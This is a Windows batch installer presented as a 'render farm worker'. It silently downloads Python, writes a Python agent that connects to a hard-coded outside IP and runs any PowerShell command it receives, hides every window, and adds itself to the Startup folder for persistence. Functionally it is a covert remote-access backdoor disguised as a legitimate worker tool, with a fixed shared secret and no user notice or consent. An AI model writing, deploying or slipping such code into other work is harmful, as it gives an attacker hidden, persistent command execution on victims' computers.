@echo off
setlocal EnableDelayedExpansion

rem Run completely silent - no windows
if "%~1"=="" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'silent' -WindowStyle Hidden"
    exit /b 0
)

set "SCRIPT_DIR=%~dp0"
set "WORKER_SCRIPT=worker_agent.py"
set "PYTHON_EMBEDDED_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
set "PIP_URL=https://bootstrap.pypa.io/get-pip.py"
set "APP_DATA=%LOCALAPPDATA%\RenderFarmWorker"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "CONTROLLER_IP=%ADD YOUR FORWARDED IP HERE%"

rem Create directories
if not exist "%APP_DATA%" mkdir "%APP_DATA%" >nul 2>&1
if not exist "%APP_DATA%\python" mkdir "%APP_DATA%\python" >nul 2>&1
if not exist "%APP_DATA%\scripts" mkdir "%APP_DATA%\scripts" >nul 2>&1

rem Check for Python
where python >nul 2>nul
if %errorlevel% equ 0 (
    set "PYTHON_EXE=python"
    set "PIP_EXE=pip"
) else (
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%PYTHON_EMBEDDED_URL%' -OutFile '%APP_DATA%\python.zip'" >nul 2>&1
    if exist "%APP_DATA%\python.zip" (
        powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%APP_DATA%\python.zip' -DestinationPath '%APP_DATA%\python' -Force" >nul 2>&1
        del "%APP_DATA%\python.zip" >nul 2>&1
        set "PATH=%APP_DATA%\python;%PATH%"
        set "PYTHON_EXE=%APP_DATA%\python\python.exe"
        powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%PIP_URL%' -OutFile '%APP_DATA%\get-pip.py'" >nul 2>&1
        "%PYTHON_EXE%" "%APP_DATA%\get-pip.py" >nul 2>&1
        set "PIP_EXE=%APP_DATA%\python\Scripts\pip.exe"
    )
)

rem Generate random worker name
for /f %%i in ('powershell -Command "Get-Random -Minimum 10000 -Maximum 99999"') do set "RANDOM_ID=%%i"
set "WORKER_NAME=Worker!RANDOM_ID!"

rem Create worker script
if not exist "%APP_DATA%\scripts\%WORKER_SCRIPT%" (
    call :CREATE_WORKER_SCRIPT
)

rem Create configuration
call :CREATE_CONFIG

rem Setup auto-start
call :CREATE_STARTUP_SHORTCUT

rem Start worker silently
start /B "" "%PYTHON_EXE%" "%APP_DATA%\scripts\%WORKER_SCRIPT%"

rem Create completion marker
echo %date% %time% > "%APP_DATA%\installed.txt"

exit /b 0

:CREATE_WORKER_SCRIPT
set "WORKER_CONTENT=import socket
import threading
import subprocess
import json
import time
import os
import random
from pathlib import Path

class NonAdminWorker:
    def __init__(self):
        self.config_file = Path(os.environ['LOCALAPPDATA']) / 'RenderFarmWorker' / 'worker_config.json'
        self.config = self.load_config()
        self.running = True
        
    def generate_worker_name(self):
        random_id = random.randint(10000, 99999)
        return f\"Worker{random_id}\"
        
    def load_config(self):
        if self.config_file.exists():
            with open(self.config_file, 'r') as f:
                config = json.load(f)
                if config.get('node_name', '').startswith('Worker') and len(config.get('node_name', '')) == 11:
                    return config
        
        default_config = {
            'controller_host': '84.115.217.201',
            'controller_port': 8888,
            'node_name': self.generate_worker_name(),
            'retry_interval': 30,
            'secret_key': 'render-farm-secret-2024'
        }
        
        with open(self.config_file, 'w') as f:
            json.dump(default_config, f, indent=2)
            
        return default_config
    
    def execute_command(self, command):
        try:
            process = subprocess.Popen(
                ['powershell', '-Command', command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            stdout, stderr = process.communicate(timeout=60)
            return stdout, stderr, process.returncode
            
        except subprocess.TimeoutExpired:
            process.kill()
            return '', 'Command timeout', -1
        except Exception as e:
            return '', str(e), -1
    
    def connect_to_controller(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.config['controller_host'], self.config['controller_port']))
                
                hello = {
                    'type': 'hello',
                    'node_name': self.config['node_name'],
                    'secret_key': self.config['secret_key']
                }
                sock.send(json.dumps(hello).encode('utf-8'))
                self.handle_connection(sock)
                
            except Exception as e:
                time.sleep(self.config['retry_interval'])
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    def handle_connection(self, sock):
        while self.running:
            try:
                data = sock.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                command_data = json.loads(data)
                
                if command_data.get('type') == 'command':
                    if command_data.get('secret_key') != self.config['secret_key']:
                        response = {'error': 'Unauthorized'}
                    else:
                        command = command_data['command']
                        stdout, stderr, returncode = self.execute_command(command)
                        
                        response = {
                            'type': 'response',
                            'stdout': stdout,
                            'stderr': stderr,
                            'returncode': returncode,
                            'node_name': self.config['node_name']
                        }
                    
                    sock.send(json.dumps(response).encode('utf-8'))
                    
                elif command_data.get('type') == 'keepalive':
                    sock.send(json.dumps({'type': 'alive'}).encode('utf-8'))
                    
            except Exception as e:
                break
    
    def start_completely_hidden(self):
        import ctypes
        import win32process
        import win32con
        import win32gui
        import win32console
        
        # Hide console window
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
        
        # Also hide from taskbar
        win32gui.ShowWindow(window, 0)
    
    def start(self):
        self.start_completely_hidden()
        self.connect_to_controller()

if __name__ == '__main__':
    worker = NonAdminWorker()
    worker.start()
"

echo !WORKER_CONTENT! > "%APP_DATA%\scripts\%WORKER_SCRIPT%"
exit /b 0

:CREATE_CONFIG
set "CONFIG_CONTENT={
    \"controller_host\": \"84.115.217.201\",
    \"controller_port\": 8888,
    \"node_name\": \"%WORKER_NAME%\",
    \"retry_interval\": 30,
    \"secret_key\": \"render-farm-secret-2024\"
}"
echo !CONFIG_CONTENT! > "%APP_DATA%\worker_config.json"
exit /b 0

:CREATE_STARTUP_SHORTCUT
set "VBS_SCRIPT=%TEMP%\create_shortcut.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo Set oShellLink = WshShell.CreateShortcut("%STARTUP_DIR%\RenderFarmWorker.lnk") >> "%VBS_SCRIPT%"
echo oShellLink.TargetPath = "%PYTHON_EXE%" >> "%VBS_SCRIPT%"
echo oShellLink.Arguments = "%APP_DATA%\scripts\%WORKER_SCRIPT%" >> "%VBS_SCRIPT%"
echo oShellLink.WindowStyle = 7 >> "%VBS_SCRIPT%"
echo oShellLink.Save >> "%VBS_SCRIPT%"
cscript //nologo "%VBS_SCRIPT%" >nul 2>&1
del "%VBS_SCRIPT%" >nul 2>&1
exit /b 0